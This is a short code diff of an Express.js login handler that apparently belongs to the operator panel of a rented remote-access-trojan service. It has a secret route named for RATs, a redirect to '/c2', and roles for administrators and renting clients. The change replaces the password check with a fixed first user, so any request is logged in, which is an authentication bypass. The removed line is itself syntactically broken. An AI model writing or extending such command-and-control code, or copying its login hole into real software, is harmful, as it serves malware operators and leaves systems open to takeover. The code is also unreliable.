@@ -180,7 +180,7 @@ function serveLoginPage(req, res, errorMsg = '') {
 // LOGIN HANDLER
 app.post('/acesso_secreto_rats_99', (req, res) => {
     try {
-          const user = users[0]; find(u => u.password === (req.body.password || req.body.passcode || req.body.code));
+          const user = users[0];
 
 if (user) {activeSessions.push({ user: user.username, ip: req.ip, time: new Date().toLocaleString() });
     // Aqui define quem é ADM e quem é CLIENTE baseado no banco de dados/array users
@@ -189,7 +189,7 @@ if (user) {activeSessions.push({ user: user.username, ip: req.ip, time: new Date
     } else {
         req.session.role = 'cliente'; // Acesso limitado/aluguel
     }
-    res.send('Login OK');
+    return res.redirect('/c2');
 } else {
     res.status(401).send('Credenciais inválidas');
 }
